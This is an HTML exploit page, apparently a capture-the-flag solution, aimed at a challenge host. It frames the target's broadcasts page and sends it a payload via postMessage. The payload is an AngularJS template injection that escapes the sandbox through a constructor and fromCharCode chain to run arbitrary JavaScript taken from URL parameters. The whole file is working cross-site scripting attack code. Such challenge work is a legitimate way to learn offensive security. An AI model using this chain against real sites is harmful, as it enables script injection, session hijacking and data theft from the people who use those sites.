<html>
  <head>
    <meta http-equiv="Content-Security-Policy" content="default-src *; script-src * 'unsafe-inline' 'unsafe-eval'">
    <title>exploit</title>
    <script>
    exploit = "alert(1)"
    window.onload = async () => {
      const url = "http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/"
      const echo = document.querySelector('#echo')
      const frame = document.querySelector('#frame')

      // Load frame
      await new Promise((resolve) => {
        frame.onload = () => resolve()
        frame.src = "http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/broadcasts"
      })
      
      const params = new URLSearchParams(window.location.search)
      let xPayload = params.get('x')
      let ngPayload = params.get('ng')
      let jsPayload = params.get('js')
      // const payload = "helloworld"

      let payload;
      if (jsPayload) {
        ngPayload = "x={1:valueOf.name.constructor.prototype};x[1].charAt=[].join;$eval(valueOf.name.constructor.fromCharCode(" + ("x=" + jsPayload).split("").map(x => x.charCodeAt(0)).join(",") + "));"
      }
      if (ngPayload) {
        payload = "\u003ciframe/srcdoc=\"\u003cscript/src=/javascripts/angular.min.js\u003e\u003c/script>\u003cdiv/ng-app\u003e{{" + ngPayload + "}}\u003c/div\u003e\"\u003e"
      }
      if (!payload) {
        payload = "?x=<payload> OR ?ng=<angular template> OR ?js=<javascript>"
      }

      if (jsPayload) {
        echo.innerText = "js payload: " + jsPayload + "\nng payload: " + ngPayload + "\npayload: " + payload
      } else if (ngPayload) {
        echo.innerText = "ng payload: " + ngPayload + "\npayload: " + payload
      } else  {
        echo.innerText = "payload: " + payload
      }
      frame.contentWindow.postMessage(payload, "*");
    }
    </script>
  </head>
  <body>
    <div id="echo"></div>
    <iframe id="frame" width="500" height="500">
    </iframe>
  </body>
</html>
